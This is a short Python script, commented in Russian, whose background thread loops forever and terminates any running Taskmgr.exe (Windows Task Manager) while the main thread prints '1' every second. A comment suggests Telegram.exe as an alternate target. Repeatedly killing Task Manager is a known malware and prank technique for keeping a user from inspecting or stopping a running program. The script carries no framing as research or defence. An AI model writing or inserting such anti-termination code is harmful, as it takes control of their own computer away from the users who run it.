from threading import Thread
from time import sleep
import psutil

def scream():
    while True:
        print(1)
        sleep(1)

def taskmgr_kill():
    while True:
        for process in psutil.process_iter(['pid', 'name']):
            try:
                if process.info['name'] == "Taskmgr.exe":  # Имя процесса может быть "Telegram.exe" для Windows
                    process.terminate()  # Завершение процесса
            except (psutil.NoSuchProcess, psutil.AccessDenied):
            # Если процесс уже завершен или доступ к нему запрещен
                continue

def main():
    Thread(target=taskmgr_kill).start()
    scream()
    

if __name__ == "__main__":
    main()